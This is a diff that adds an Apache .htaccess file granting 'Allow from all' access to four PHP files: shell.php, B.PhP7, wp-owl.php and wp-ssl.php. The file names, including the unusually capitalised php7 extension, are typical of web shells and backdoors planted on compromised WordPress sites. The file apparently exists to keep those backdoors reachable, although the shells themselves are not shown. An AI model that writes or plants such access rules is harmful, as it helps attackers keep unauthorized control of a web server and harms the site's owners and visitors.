@@ -1,0 +1,19 @@
+<Files shell.php>
+      Order Deny,Allow
+	   Allow from all
+</files>	  
+
+<Files B.PhP7>
+      Order Deny,Allow
+	   Allow from all
+</files>	 
+
+<Files wp-owl.php>
+      Order Deny,Allow
+	   Allow from all
+</files>	  
+
+<Files wp-ssl.php>
+      Order Deny,Allow
+	   Allow from all
+</files>	 
